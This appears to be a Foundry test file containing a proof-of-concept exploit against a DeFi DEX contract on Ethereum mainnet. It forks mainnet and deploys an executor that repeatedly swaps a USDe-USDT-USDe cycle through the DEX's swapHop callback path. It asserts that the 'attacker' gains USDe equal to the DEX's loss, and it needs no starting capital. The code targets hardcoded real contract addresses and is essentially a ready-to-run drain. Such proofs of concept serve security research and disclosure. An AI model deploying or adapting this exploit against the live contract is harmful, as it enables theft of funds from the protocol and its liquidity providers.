// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";

struct DexKeyExecution {
    address token0;
    address token1;
    bytes32 salt;
}

struct TransferParamsExecution {
    address to;
    bool isCallback;
    bytes callbackData;
    bytes extraData;
}

interface IERC20Execution {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDexLiteExecution {
    function swapHop(
        address[] calldata path,
        DexKeyExecution[] calldata dexKeys,
        int256 amountSpecified,
        uint256[] calldata amountLimits,
        TransferParamsExecution calldata transferParams
    ) external payable returns (uint256 amountUnspecified);
}

interface IDexLiteCallbackExecution {
    function dexCallback(address token, uint256 amount, bytes calldata data) external;
}

contract DexLiteCycleExecutor is IDexLiteCallbackExecution {
    address internal constant DEX_LITE = 0xBbcb91440523216e2b87052A99F69c604A7b6e00;
    address internal constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    function executeOne(uint256 exactUsdeOut) external returns (uint256 requiredUsdeIn) {
        address[] memory path = new address[](3);
        path[0] = USDE;
        path[1] = USDT;
        path[2] = USDE;

        DexKeyExecution[] memory keys = new DexKeyExecution[](2);
        DexKeyExecution memory key = DexKeyExecution(USDE, USDT, bytes32(0));
        keys[0] = key;
        keys[1] = key;

        uint256[] memory limits = new uint256[](2);
        limits[0] = type(uint256).max;
        limits[1] = type(uint256).max;

        requiredUsdeIn = IDexLiteExecution(DEX_LITE).swapHop(
            path,
            keys,
            -int256(exactUsdeOut),
            limits,
            TransferParamsExecution(address(this), true, "", "")
        );
    }

    function dexCallback(address token, uint256 amount, bytes calldata) external {
        require(msg.sender == DEX_LITE, "ONLY_DEX_LITE");
        require(token == USDE, "UNEXPECTED_TOKEN");
        require(IERC20Execution(token).transfer(DEX_LITE, amount), "PAYBACK_FAILED");
    }
}

contract DexLiteZeroCapitalCycleExecutionTest is Test {
    address internal constant DEX_LITE = 0xBbcb91440523216e2b87052A99F69c604A7b6e00;
    address internal constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    uint256 internal constant EXACT_USDE_OUT = 1e15;
    uint256 internal constant MAX_ROUNDS = 512;

    event ExecutedCycle(
        uint256 indexed round,
        uint256 requiredInput,
        uint256 attackerGain,
        uint256 dexLoss
    );

    event ExecutionSummary(
        uint256 successfulRounds,
        uint256 totalAttackerGain,
        uint256 totalDexLoss,
        uint256 firstRoundGain,
        uint256 lastRoundGain
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("MAINNET_FORK_BLOCK"));
        assertEq(block.chainid, 1, "unexpected chain");
        assertGt(DEX_LITE.code.length, 0, "DexLite missing");
    }

    function test_zeroCapitalRepeatedPoolCycle_drainsRealUSDeBalance() public {
        DexLiteCycleExecutor executor = new DexLiteCycleExecutor();
        IERC20Execution usde = IERC20Execution(USDE);

        assertEq(usde.balanceOf(address(executor)), 0, "executor must start empty");

        uint256 attackerStart = usde.balanceOf(address(executor));
        uint256 dexStart = usde.balanceOf(DEX_LITE);
        uint256 successfulRounds;
        uint256 firstRoundGain;
        uint256 lastRoundGain;

        for (uint256 i; i < MAX_ROUNDS; ++i) {
            uint256 snapshot = vm.snapshotState();
            uint256 attackerBefore = usde.balanceOf(address(executor));
            uint256 dexBefore = usde.balanceOf(DEX_LITE);

            try executor.executeOne(EXACT_USDE_OUT) returns (uint256 requiredInput) {
                uint256 attackerAfter = usde.balanceOf(address(executor));
                uint256 dexAfter = usde.balanceOf(DEX_LITE);
                uint256 gain = attackerAfter > attackerBefore ? attackerAfter - attackerBefore : 0;
                uint256 loss = dexBefore > dexAfter ? dexBefore - dexAfter : 0;

                if (gain == 0 || loss != gain) {
                    vm.revertToState(snapshot);
                    break;
                }

                ++successfulRounds;
                if (successfulRounds == 1) firstRoundGain = gain;
                lastRoundGain = gain;
                emit ExecutedCycle(i, requiredInput, gain, loss);
            } catch {
                vm.revertToState(snapshot);
                break;
            }
        }

        uint256 attackerEnd = usde.balanceOf(address(executor));
        uint256 dexEnd = usde.balanceOf(DEX_LITE);
        uint256 totalGain = attackerEnd - attackerStart;
        uint256 totalLoss = dexStart - dexEnd;

        emit ExecutionSummary(
            successfulRounds,
            totalGain,
            totalLoss,
            firstRoundGain,
            lastRoundGain
        );

        emit log_named_uint("successful profitable rounds", successfulRounds);
        emit log_named_uint("total attacker USDe gain", totalGain);
        emit log_named_uint("total DexLite USDe loss", totalLoss);
        emit log_named_uint("first round gain", firstRoundGain);
        emit log_named_uint("last round gain", lastRoundGain);

        assertGt(successfulRounds, 0, "no actual profitable cycle");
        assertGt(totalGain, 0, "no attacker gain");
        assertEq(totalLoss, totalGain, "gain must equal real DexLite loss");
    }
}
